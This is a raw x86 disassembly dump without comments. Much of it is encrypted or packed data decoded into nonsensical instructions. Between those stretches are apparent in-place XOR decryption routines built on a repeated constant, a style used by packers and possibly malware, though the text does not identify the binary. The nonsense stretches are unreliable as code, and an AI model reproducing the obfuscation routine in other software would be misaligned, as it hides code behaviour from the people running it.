  409410:	adc    ah,BYTE PTR [eax+ecx*8+0x40d70450]
  409417:	mov    al,0x98
  409419:	pop    edi
  40941a:	pop    esi
  40941b:	xchg   esi,eax
  40941c:	test   al,0xd0
  40941e:	test   BYTE PTR [edx-0x74],al
  409421:	ins    BYTE PTR es:[edi],dx
  409422:	dec    eax
  409423:	push   ds
  409424:	test   DWORD PTR [edx+0x4a],esi
  409427:	test   BYTE PTR [ebx+0x1f152243],dh
  40942d:	jle    0x409427
  40942f:	pushf  
  409430:	lea    ecx,[eax+0x42]
  409433:	dec    edx
  409434:	push   edx
  409436:	fmul   DWORD PTR fs:[edi+0x4b0d4cd8]
  40943d:	sub    edx,edx
  40943f:	addr16 mov eax,0xce31f7a3
  409445:	xchg   ecx,eax
  409446:	dec    edx
  409447:	jmp    0x409459
  409449:	push   0x63
  40944b:	adc    DWORD PTR [edi],eax
  40944d:	aad    0x78
  40944f:	fwait
  409450:	cmp    dl,BYTE PTR [esi-0x2a]
  409453:	dec    esp
  409454:	dec    esi
  409455:	sbb    ah,BYTE PTR [ecx]
  409457:	push   eax
  409458:	outs   dx,BYTE PTR ds:[esi]
  409459:	imul   ebx,DWORD PTR [eax],0xa5bf7dbd
  40945f:	popf   
  409460:	dec    esp
  409461:	scas   al,BYTE PTR es:[edi]
  409462:	pop    edx
  409463:	mov    ds:0xf9220f82,al
  409468:	repnz jmp 0x368a:0x841ebe03
  409470:	adc    al,0x5b
  409472:	(bad)  
  409473:	int    0x32
  409475:	and    al,BYTE PTR [ebx]
  409477:	pop    esi
  409478:	jbe    0x409420
  40947a:	jle    0x40944a
  40947c:	sub    BYTE PTR [esp+ecx*2+0x4167c875],cl
  409483:	int3   
  409484:	retf   0x9e01
  409487:	daa    
  409488:	or     BYTE PTR [edx-0xe09e7cd],bl
  40948e:	outs   dx,BYTE PTR ds:[esi]
  40948f:	sub    eax,0x90d948e7
  409494:	(bad)  [edx+0x1c066075]
  40949a:	repnz cli 
  40949c:	into   
  40949d:	std    
  40949e:	jne    0x409519
  4094a0:	nop
  4094a1:	in     eax,dx
  4094a2:	cmp    esi,esp
  4094a4:	rcl    DWORD PTR [edi],0xe6
  4094a7:	jne    0x40942e
  4094a9:	lea    ecx,ds:0x72b05e17
  4094af:	retf   0x3461
  4094b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094b3:	cmp    BYTE PTR [edi+0x1],ah
  4094b6:	out    dx,eax
  4094b7:	sub    bh,0x0
  4094ba:	popf   
  4094bb:	int    0x8f
  4094bd:	push   eax
  4094be:	xchg   BYTE PTR [ebx-0x50],bh
  4094c1:	xor    eax,0x1f119304
  4094c6:	imul   edx,DWORD PTR [esi],0xb2444e30
  4094cc:	jnp    0x4094f4
  4094ce:	sbb    eax,0xd7d4b19d
  4094d3:	aad    0x7
  4094d5:	sbb    BYTE PTR [esi-0x5d],ah
  4094d8:	idiv   DWORD PTR [esi+edi*2+0x2a]
  4094dc:	dec    ecx
  4094dd:	and    BYTE PTR [edx+0x71],ch
  4094e0:	sti    
  4094e1:	sbb    BYTE PTR [ebp+0x594952d7],bl
  4094e7:	xlat   BYTE PTR ds:[ebx]
  4094e8:	aad    0xf4
  4094ea:	inc    eax
  4094eb:	aaa    
  4094ec:	das    
  4094ed:	jp     0x4094f3
  4094ef:	(bad)  [esi-0x2b77f75d]
  4094f5:	sbb    dh,BYTE PTR [esi+ebx*4+0x6e]
  4094f9:	pop    eax
  4094fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094fb:	xor    DWORD PTR [esi],edx
  4094fd:	sub    edx,edx
  4094ff:	outs   dx,BYTE PTR ds:[esi]
  409500:	or     al,0xe
  409502:	pop    esp
  409503:	out    0x39,eax
  409505:	fs cmp eax,0xf7f6071d
  40950b:	lds    esi,FWORD PTR [esi-0x25]
  40950e:	fbld   TBYTE PTR [ecx]
  409510:	sub    DWORD PTR [ebx-0x415da2a6],ecx
  409516:	lods   al,BYTE PTR ds:[esi]
  409517:	jecxz  0x409556
  409519:	xor    BYTE PTR [eax+0x19],al
  40951c:	add    bh,bl
  40951e:	das    
  40951f:	xchg   ebp,eax
  409520:	fwait
  409521:	inc    ecx
  409522:	and    DWORD PTR [esi],esi
  409524:	out    0xb4,eax
  409526:	sbb    al,0xed
  409528:	mov    ds,WORD PTR [edi+0x20]
  40952b:	push   edi
  40952c:	addr16 gs and dh,bh
  409530:	hlt    
  409531:	lods   al,BYTE PTR ds:[esi]
  409532:	sahf   
  409533:	and    esp,ebx
  409535:	mov    es,WORD PTR [ebx-0x12e1148e]
  40953b:	std    
  40953c:	ret    
  40953d:	cli    
  40953e:	out    dx,al
  40953f:	jnp    0x409520
  409541:	icebp  
  409542:	out    0xa6,al
  409544:	add    al,0xcd
  409546:	mov    ebx,0xed308df1
  40954b:	add    eax,0x330df1a3
  409550:	shr    DWORD PTR [eax],cl
  409552:	push   ebp
  409553:	daa    
  409554:	fsubr  st(0),st
  409556:	test   bl,bh
  409558:	cmp    DWORD PTR [ebp-0x132cb75d],0x1f4153
  409562:	(bad)
  409565:	pop    edx
  409566:	test   DWORD PTR [edx],eax
  409568:	popa   
  409569:	and    eax,0x18376ab
  40956e:	jbe    0x4095b7
  409570:	ins    DWORD PTR es:[edi],dx
  409571:	or     DWORD PTR [eax-0x63],ebx
  409574:	ss mov ch,0x37
  409577:	into   
  409578:	inc    esi
  409579:	sbb    esi,ecx
  40957b:	fs inc eax
  40957d:	mov    ds:0xf12308ba,al
  409582:	inc    edx
  409584:	scas   eax,DWORD PTR es:[edi]
  409585:	cli    
  409586:	(bad)  
  409587:	fcomi  st,st(3)
  409589:	mov    edx,ebp
  40958b:	(bad)  
  40958c:	dec    ebx
  40958d:	fninit 
  40958f:	xchg   ebp,edx
  409591:	mov    eax,ds:0x1032f7db
  409596:	das    
  409597:	mov    esp,DWORD PTR [eax-0x2e]
  40959a:	ss icebp 
  40959c:	inc    ecx
  40959d:	add    ah,ch
  40959f:	loopne 0x4095ed
  4095a1:	ins    BYTE PTR es:[edi],dx
  4095a2:	jmp    0x7baa:0x9305fca
  4095a9:	jecxz  0x409582
  4095ab:	mov    BYTE PTR [ebp+eiz*1+0x12],dh
  4095af:	std    
  4095b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095b1:	push   ss
  4095b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095b3:	ja     0x409555
  4095b5:	iret   
  4095b6:	(bad)  
  4095b7:	mov    ch,0x17
  4095b9:	fdivr  DWORD PTR [eax]
  4095bb:	pop    esi
  4095bc:	mov    bh,0x62
  4095be:	fnclex 
  4095c0:	xchg   esi,eax
  4095c1:	mov    gs,WORD PTR [ebx+0x60]
  4095c4:	or     al,0x47
  4095c6:	leave  
  4095c7:	aam    0x1f
  4095c9:	arpl   WORD PTR [eax+0x67ee8fc7],sp
  4095cf:	inc    esp
  4095d0:	push   ebp
  4095d1:	xchg   esi,eax
  4095d2:	in     eax,dx
  4095d3:	inc    eax
  4095d4:	pop    ss
  4095d5:	not    cl
  4095d7:	iret   
  4095d8:	fsub   st(3),st
  4095da:	loope  0x409599
  4095dc:	sbb    eax,0x935f1fbd
  4095e1:	hlt    
  4095e2:	push   esi
  4095e3:	cmp    al,BYTE PTR [edx]
  4095e5:	add    eax,0x5e1edd67
  4095ea:	aam    0x8e
  4095ec:	pop    ss
  4095ed:	xchg   esi,eax
  4095ee:	mov    WORD PTR [ecx-0x4abf4d2f],es
  4095f4:	std    
  4095f5:	lea    eax,[ebx]
  4095f7:	jne    0x40957e
  4095f9:	mov    al,0xf0
  4095fb:	xchg   BYTE PTR [esi+0x47f25b50],ch
  409601:	pop    ds
  409602:	enter  0xd884,0x6c
  409606:	dec    edx
  409607:	dec    eax
  409608:	pop    esp
  409609:	push   ebp
  40960a:	pop    esi
  40960b:	cwde   
  40960c:	push   es
  40960d:	ins    BYTE PTR es:[edi],dx
  40960e:	gs imul ebx,esp,0xfffffffe
  409612:	arpl   WORD PTR gs:[eax-0x4e30b632],dx
  409619:	pop    es
  40961a:	aam    0x8a
  40961c:	xor    al,0x38
  40961e:	sbb    DWORD PTR [ebx-0x13d438e5],0x9b4a7032
  409628:	enter  0x3feb,0x8b
  40962c:	push   ss
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x4225c8
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0x38bca5c6
  4097de:	jg     0x409787
  4097e0:	mov    esp,0x18184147
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [ecx-0x3a],al
  4097eb:	push   edx
  4097ec:	loope  0x409817
  4097ee:	mov    ebx,0xaf9d03e
  4097f3:	pop    es
  4097f4:	xchg   DWORD PTR [edx-0x6f],esp
  4097f7:	jl     0x4097db
  4097f9:	(bad)  
  4097fa:	ror    DWORD PTR [esi+esi*4-0x5d939d16],cl
  409801:	xchg   ecx,eax
  409802:	inc    ebp
  409803:	mov    cl,0x8f
  409805:	pop    ds
  409806:	xor    al,0xe7
  409808:	cmc    
  409809:	lahf   
  40980a:	sahf   
  40980b:	out    dx,al
  40980c:	xor    ebx,ecx
  40980e:	sbb    BYTE PTR [edi-0x68f464e4],0xb7
  409815:	xchg   ebx,eax
  409816:	in     eax,dx
  409817:	push   ebp
  409818:	jbe    0x40987e
  40981a:	sbb    ch,BYTE PTR es:[ebx]
  40981d:	shr    ebx,1
  40981f:	mov    bh,0xed
  409821:	xchg   edx,eax
  409822:	ja     0x409813
  409824:	call   0xf223:0xb96d5a1f
  40982b:	mov    dh,0x2c
  40982d:	inc    ebx
  40982e:	imul   edi,esp,0x92b1caf7
  409834:	xlat   BYTE PTR ds:[ebx]
  409835:	mov    esp,0xad68b860
  40983a:	aad    0x60
  40983c:	sub    BYTE PTR [eax+0x5a742b26],0x92
  409843:	mov    ds:0x5fb703b2,eax
  409848:	loop   0x4097ed
  40984a:	rol    BYTE PTR [edx-0x2c019d74],cl
  409850:	sub    eax,0xddf00808
  409855:	and    DWORD PTR [ecx+0x6107ea4],esp
  40985b:	mov    ah,0xb7
  40985d:	pushf  
  40985e:	adc    al,0x2f
  409860:	add    edi,edi
  409862:	sub    eax,0xade0acfc
  409867:	jl     0x409830
  409869:	(bad)  
  40986a:	xor    eax,0x646e74e3
  40986f:	shr    BYTE PTR [edi+ebp*4-0x19],0xfe
  409874:	stos   BYTE PTR es:[edi],al
  409875:	imul   ch
  409877:	adc    ch,ch
  409879:	inc    edi
  40987a:	dec    edx
  40987b:	push   edx
  40987c:	stc    
  40987d:	and    eax,0x5c9f5679
  409882:	sub    al,BYTE PTR [esi-0x456491f5]
  409888:	out    0xc6,al
  40988a:	adc    eax,0x2785a081
  40988f:	data16 jge 0x409831
  409892:	inc    eax
  409893:	retf   0x4096
  409896:	jo     0x409898
  409898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409899:	pop    ds
  40989a:	xchg   edi,eax
  40989b:	inc    edx
  40989c:	mov    ebp,0xa66441a4
  4098a1:	xchg   ecx,eax
  4098a2:	aaa    
  4098a3:	add    al,0x1a
  4098a5:	ins    BYTE PTR es:[edi],dx
  4098a6:	jno    0x409913
  4098a8:	cs push cs
  4098aa:	cli    
  4098ab:	out    0x2f,eax
  4098ad:	das    
  4098ae:	or     eax,0x30bbb6ac
  4098b3:	sub    ch,BYTE PTR [esi]
  4098b5:	pop    ss
  4098b6:	cmp    ebx,DWORD PTR [ecx+0x71d943f1]
  4098bc:	pushf  
  4098bd:	jle    0x4098f7
  4098bf:	lock or DWORD PTR [ecx+ebx*4+0x16bb716a],edx
  4098c7:	out    0x2d,eax
  4098c9:	mov    al,0xb2
  4098cb:	sub    bl,BYTE PTR [ecx-0xa]
  4098ce:	mov    dl,0xa2
  4098d0:	ret    
  4098d1:	mov    ah,0x9b
  4098d3:	mov    edi,0xa49e52d0
  4098d8:	add    eax,0xd7a176c0
  4098dd:	xor    al,0x96
  4098df:	dec    ebx
  4098e0:	test   al,0xfa
  4098e2:	shl    DWORD PTR [ecx-0x3e030e53],0xf2
  4098e9:	pop    edx
  4098ea:	test   DWORD PTR [ebx+eiz*1+0x6c],ebp
  4098ee:	aam    0x94
  4098f0:	mov    ebp,0x9a826ecd
  4098f5:	aaa    
  4098f6:	outs   dx,DWORD PTR ds:[esi]
  4098f7:	(bad)  
  4098f8:	add    eax,0xb9bb15f4
  4098fd:	lods   al,BYTE PTR ds:[esi]
  4098fe:	xchg   BYTE PTR [eax-0x28],ah
  409901:	push   esp
  409902:	xchg   edx,eax
  409903:	mov    edx,0xeaa51124
  409908:	push   ebx
  409909:	push   ds
  40990a:	push   0xfffffff3
  40990c:	mov    esp,0x5fed6093
  409911:	test   DWORD PTR [esi-0x55eb1f7a],0x74536fd3
  40991b:	lahf   
  40991c:	mov    eax,ds:0x7a260fb7
  409921:	pop    eax
  409922:	pusha  
  409923:	bound  ebp,QWORD PTR [edi+0x7adc2469]
  409929:	(bad)  [esi+0x42]
  40992c:	jno    0x4098e7
  40992e:	hlt    
  40992f:	jmp    0x642a:0xc3b62a88
  409936:	pop    edx
  409937:	and    eax,0xf1e7a1d1
  40993c:	add    esi,DWORD PTR ds:0x7b68fe7e
  409942:	mov    cl,0x67
  409944:	push   0xc2a56d94
  409949:	xchg   esp,eax
  40994a:	(bad)  
  40994b:	(bad)  
  40994d:	cld    
  40994e:	and    DWORD PTR [ebp+0x25],0xd40bbcdc
  409955:	loope  0x4099a8
  409957:	add    al,0x19
  409959:	stos   DWORD PTR es:[edi],eax
  40995a:	adc    eax,0x5009e97b
  40995f:	stos   BYTE PTR es:[edi],al
  409960:	test   BYTE PTR [ebx-0x74f88179],dl
  409966:	mov    esp,DWORD PTR [esp+edx*2]
  409969:	les    ebx,FWORD PTR [ebx+0x2f]
  40996c:	cmp    edi,DWORD PTR [edi]
  40996e:	jb     0x40990c
  409970:	add    eax,0x364e0eef
  409975:	inc    ebx
  409976:	add    DWORD PTR [ebx],edx
  409978:	push   es
  409979:	dec    ebp
  40997a:	aaa    
  40997b:	fld    QWORD PTR [edi]
  40997d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40997e:	mov    ah,0xac
  409980:	dec    eax
  409981:	sub    cl,BYTE PTR [ebx+eiz*1]
  409984:	or     al,bl
  409986:	in     eax,0x7d
  409988:	(bad)  
  409989:	call   0x35c133eb
  40998e:	cli    
  40998f:	pop    esp
  409990:	pop    ebx
  409991:	add    BYTE PTR [esi+0x2363ff68],dh
  409997:	jp     0x409935
  409999:	xchg   esp,eax
  40999a:	xchg   BYTE PTR [edx+0x73da3259],cl
  4099a0:	mov    ebx,0x244af620
  4099a5:	fldcw  WORD PTR [edx]
  4099a7:	and    DWORD PTR [esi-0x5d],eax
  4099aa:	outs   dx,DWORD PTR ds:[esi]
  4099ab:	mov    esi,0x4fa72400
  4099b0:	jns    0x40998d
  4099b2:	mov    DWORD PTR [ebx+0x45],ecx
  4099b5:	xchg   ebx,eax
  4099b6:	es mov bh,0x29
  4099b9:	inc    ebp
  4099ba:	jno    0x40998a
  4099bc:	pop    ds
  4099bd:	std    
  4099be:	mov    eax,0xa37339d7
  4099c3:	dec    edx
  4099c4:	push   ecx
  4099c5:	xchg   edi,eax
  4099c6:	inc    DWORD PTR [eax+eiz*8-0x18]
  4099ca:	sub    BYTE PTR [esi-0x36],dh
  4099cd:	sub    BYTE PTR [ecx-0x1fb1e676],ah
  4099d3:	mov    bh,0x0
  4099d5:	xor    al,0xd6
  4099d7:	retf   0x395b
  4099da:	xor    eax,0x4698e313
  4099df:	jb     0x4099c2
  4099e1:	pop    esp
  4099e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099e3:	and    al,0x39
  4099e5:	and    ch,al
  4099e7:	jle    0x409a09
  4099e9:	mov    dl,0xf2
  4099eb:	call   0x96746d40
  4099f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099f1:	inc    esi
  4099f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099f3:	sub    BYTE PTR [ebx+0x27],dh
  4099f6:	cmp    BYTE PTR [ebp+0x9549647],dh
  4099fc:	in     al,dx
  4099fd:	je     0x4099ec
  4099ff:	jne    0x409a68
  409a01:	popf   
  409a02:	fwait
  409a03:	and    esi,edi
  409a05:	(bad)  
  409a06:	push   ebp
  409a07:	lock clc 
  409a09:	pop    es
  409a0a:	mov    ch,0xb3
  409a0c:	sub    DWORD PTR [ecx-0x5ef0278f],edx
  409a12:	push   esp
  409a13:	pop    es
  409a14:	push   cs
  409a15:	stc    
  409a16:	cmc    
  409a17:	xchg   edx,eax
  409a18:	mov    al,ds:0xc7631a7b
  409a1d:	jmp    0x734af3a3
  409a22:	inc    ebx
  409a23:	imul   esi
  409a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a26:	or     DWORD PTR [edi-0x7f],ebp
  409a29:	outs   dx,DWORD PTR ds:[esi]
  409a2a:	sahf   
  409a2b:	jmp    0x315c:0x52e7fb09
  409a32:	inc    eax
  409a33:	daa    
  409a34:	jp     0x4099cd
  409a36:	jbe    0x409a29
  409a38:	jb     0x409a2a
  409a3a:	(bad)  
  409a3c:	icebp  
  409a3d:	push   ebx
  409a3e:	dec    ebx
  409a3f:	loopne 0x409a30
  409a41:	adc    al,0xf7
  409a43:	loope  0x409a2b
  409a45:	jmp    0x2f65:0xb43c4c5b
  409a4c:	ins    DWORD PTR es:[edi],dx
  409a4d:	mov    edx,0x86888541
  409a52:	dec    ebx
  409a53:	xor    dl,BYTE PTR [ebx+0x10]
  409a56:	jnp    0x409a06
  409a58:	xchg   BYTE PTR [esi-0x3fe00ef3],cl
  409a5e:	push   ds
  409a5f:	mov    ah,BYTE PTR [ecx+0x2fa77355]
  409a65:	xchg   edi,eax
  409a66:	stc    
  409a67:	fxch   st(3)
  409a69:	loop   0x4099ee
  409a6b:	jmp    0xde22:0x2c0fe2bc
  409a72:	pop    edi
  409a73:	sub    al,0x66
  409a75:	jmp    0xe329:0x2f0d73a4
  409a7c:	sbb    eax,0xa7d18f6f
  409a81:	repnz xlat BYTE PTR ds:[ebx]
  409a83:	sbb    ah,BYTE PTR [ebp+0x1f]
  409a86:	add    edi,DWORD PTR [esi+ebx*4+0x34]
  409a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a8b:	out    0x84,al
  409a8d:	lock js 0x409ae0
  409a90:	mov    cl,0x4a
  409a92:	stc    
  409a93:	hlt    
  409a94:	jmp    0x9e8b52a2
  409a99:	in     eax,dx
  409a9a:	pop    ebp
  409a9b:	(bad)  
  409a9c:	test   eax,0x7bdcb1e5
  409aa1:	pop    edx
  409aa2:	loop   0x409acd
  409aa4:	push   edi
  409aa5:	fcmovnu st,st(0)
  409aa7:	pop    ds
  409aa8:	stos   BYTE PTR es:[edi],al
  409aa9:	sbb    edx,ebx
  409aab:	or     al,0xb0
  409aad:	sbb    BYTE PTR [ebp-0x43],bl
  409ab0:	add    ecx,esi
  409ab2:	pop    es
  409ab3:	dec    ecx
  409ab4:	mov    ch,0xec
  409ab6:	adc    eax,0xb0aed87a
  409abb:	inc    eax
  409abc:	rcr    DWORD PTR [edx],0xec
  409abf:	jno    0x409a46
  409ac1:	inc    edx
  409ac2:	hlt    
  409ac3:	int    0xf3
  409ac5:	shl    BYTE PTR [edx-0x1e805f5b],cl
  409acb:	(bad)  
  409acc:	mov    ebx,0xe045e75d
  409ad1:	xor    al,0x40
  409ad3:	sub    DWORD PTR [edi-0x31],eax
  409ad6:	xchg   DWORD PTR [ecx],ebx
  409ad8:	mov    DWORD PTR [esi+0xe6d2e2c],edx
  409ade:	pushf  
  409adf:	push   esi
  409ae0:	mov    ebp,0x4642d1c3
  409ae5:	aas    
  409ae6:	push   ebx
  409ae7:	shl    BYTE PTR [ecx+0x57a50f5a],0xff
  409aee:	push   ebx
  409aef:	mov    bh,0x84
  409af1:	pop    ebx
  409af2:	mov    ?,WORD PTR [ebp+esi*1+0x1a6b4b45]
  409af9:	push   es
  409afa:	out    dx,eax
  409afb:	mov    ds:0x94d939e4,al
  409b00:	sbb    esp,ebp
  409b02:	call   0x8749:0x21d928bc
  409b09:	icebp  
  409b0a:	(bad)  
  409b0b:	outs   dx,DWORD PTR ds:[esi]
  409b0c:	jecxz  0x409b59
  409b0e:	and    al,0x45
  409b10:	leave  
  409b11:	sub    al,0x89
  409b13:	int    0x37
  409b15:	fwait
  409b16:	ins    DWORD PTR es:[edi],dx
  409b17:	ret    0xed7e
  409b1a:	mov    al,0x40
  409b1c:	jecxz  0x409b08
  409b1e:	pop    esi
  409b1f:	pushf  
  409b20:	(bad)  
  409b21:	mov    cl,0x27
  409b23:	adc    eax,DWORD PTR [ebp+0x58]
  409b26:	imul   DWORD PTR [edi+0x75]
  409b29:	and    eax,0x5a6ec5a4
  409b2e:	fwait
  409b2f:	sbb    ecx,DWORD PTR [edi+0x3c]
  409b32:	stos   DWORD PTR es:[edi],eax
  409b33:	jnp    0x409ad4
  409b35:	cs inc ebx
  409b37:	in     al,0x5e
  409b39:	imul   esi,edx,0x15
  409b3c:	cmp    DWORD PTR [edi],eax
  409b3e:	cmpxchg DWORD PTR [ecx],esi
  409b41:	test   eax,0xb73b9c8a
  409b46:	and    DWORD PTR [eax-0x9f559e2],edi
  409b4c:	push   esi
  409b4d:	inc    eax
  409b4e:	mov    esp,0x4f34da70
  409b53:	or     al,0xe8
  409b55:	lahf   
  409b56:	dec    esi
  409b57:	(bad)  [ecx]
  409b59:	ret    0xcf81
  409b5c:	stc    
  409b5d:	dec    edx
  409b5e:	cmp    BYTE PTR [esp+ecx*8+0x4c2b60ca],al
  409b65:	pop    ebp
  409b66:	mov    esi,0x716ff477
  409b6b:	lds    esp,FWORD PTR [ebp+0x3d208973]
  409b71:	out    0xd9,eax
  409b73:	ins    DWORD PTR es:[edi],dx
  409b74:	outs   dx,BYTE PTR ds:[esi]
  409b75:	adc    eax,DWORD PTR [eax+0x7d26fd90]
  409b7b:	dec    edi
  409b7c:	(bad)  
  409b7d:	rol    BYTE PTR ds:0x4de4a3dc,cl
  409b83:	sti    
  409b84:	jmp    0x409bda
  409b86:	out    dx,eax
  409b87:	jmp    0x7bf4:0x51fb9a46
  409b8e:	data16 jbe 0x409bc9
  409b91:	rcl    dl,1
  409b93:	in     eax,0xd6
  409b95:	les    eax,FWORD PTR [edi-0x273fd20f]
  409b9b:	ins    BYTE PTR es:[edi],dx
  409b9c:	int3   
  409b9d:	sti    
  409b9e:	sahf   
  409b9f:	cdq    
  409ba0:	dec    edx
  409ba1:	ins    DWORD PTR es:[edi],dx
  409ba2:	dec    eax
  409ba3:	or     BYTE PTR [ecx],bh
  409ba5:	pop    DWORD PTR [eax+0x334cb20d]
  409bab:	ror    BYTE PTR [ebx],cl
  409bad:	ret    0x503
  409bb0:	enter  0x4225,0x0
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
